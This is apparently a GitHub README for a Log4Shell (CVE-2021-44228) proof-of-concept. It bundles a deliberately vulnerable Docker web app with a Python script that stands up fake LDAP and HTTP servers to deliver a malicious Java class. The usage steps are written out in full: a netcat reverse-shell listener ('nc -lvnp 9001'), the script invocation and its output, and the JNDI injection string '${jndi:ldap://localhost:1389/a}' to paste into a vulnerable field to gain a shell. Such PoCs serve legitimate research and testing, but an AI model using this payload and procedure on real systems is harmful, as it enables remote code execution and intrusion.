# log4j-shell-poc
A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.

Proof-of-concept (POC)
----------------------

As a PoC we have created a python file that automates the process. 


#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:


* Start a netcat listener to accept reverse shell connection.<br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>

Inside the `initial_exploit` folder run
```
docker build --network host -t log4j_initial . 
docker run --network host log4j_initial
```

```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

Our vulnerable application
--------------------------

We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:

Inside the `vulnerable-application` folder run
```c
docker build -t log4j-shell-poc .
docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080
